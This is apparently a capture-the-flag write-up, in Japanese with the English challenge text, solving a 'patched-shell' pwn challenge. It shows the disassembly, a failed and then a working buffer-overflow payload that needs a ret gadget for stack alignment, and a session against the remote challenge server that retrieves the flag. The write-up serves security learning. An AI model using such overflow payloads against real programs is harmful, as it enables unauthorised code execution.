# patched-shell:Pwn:250pts
Okay, okay. So you were smart enough to do basic overflow huh...  
Now try this challenge! I patched the shell function so it calls system instead of execve... so now your exploit shouldn't work! bwahahahahaha  
Note: due to the copycat nature of this challenge, it suffers from the same bug that was in basic-overflow. see the cryptic message there for more information.  

`nc 34.134.173.142 5000`  
[patched-shell](patched-shell)  

# Solution
execveの代わりにsystemを呼び出しているらしい。  
```bash
$ objdump -D ./patched-shell

./patched-shell:     file format elf64-x86-64
~~~
0000000000401136 <shell>:
  401136:       55                      push   %rbp
  401137:       48 89 e5                mov    %rsp,%rbp
  40113a:       48 8d 05 c3 0e 00 00    lea    0xec3(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  401141:       48 89 c7                mov    %rax,%rdi
  401144:       e8 e7 fe ff ff          call   401030 <system@plt>
  401149:       90                      nop
  40114a:       5d                      pop    %rbp
  40114b:       c3                      ret

000000000040114c <main>:
  40114c:       55                      push   %rbp
  40114d:       48 89 e5                mov    %rsp,%rbp
  401150:       48 83 ec 40             sub    $0x40,%rsp
  401154:       48 8d 45 c0             lea    -0x40(%rbp),%rax
  401158:       48 89 c7                mov    %rax,%rdi
  40115b:       b8 00 00 00 00          mov    $0x0,%eax
  401160:       e8 db fe ff ff          call   401040 <gets@plt>
  401165:       b8 00 00 00 00          mov    $0x0,%eax
  40116a:       c9                      leave
  40116b:       c3                      ret
~~~
$ (echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x36\x11\x40\x00\x00\x00\x00\x00';cat) | ./patched-shell
whoami
Segmentation fault
```
確かにシェルが取れない。  
おそらくスタックアラインメントだろうと予想し、`ret`を一度挟めばよい。  
```bash
$ (echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4b\x11\x40\x00\x00\x00\x00\x00\x36\x11\x40\x00\x00\x00\x00\x00';cat) | ./patched-shell
whoami
satoki
```
リモートへ試す。  
```bash
$ (echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4b\x11\x40\x00\x00\x00\x00\x00\x36\x11\x40\x00\x00\x00\x00\x00';cat) | nc 34.134.173.142 5000
id
uid=1000 gid=1000 groups=1000
ls
flag
run
cat flag
uoftctf{patched_the_wrong_function}
```
flagが得られた。  

## uoftctf{patched_the_wrong_function}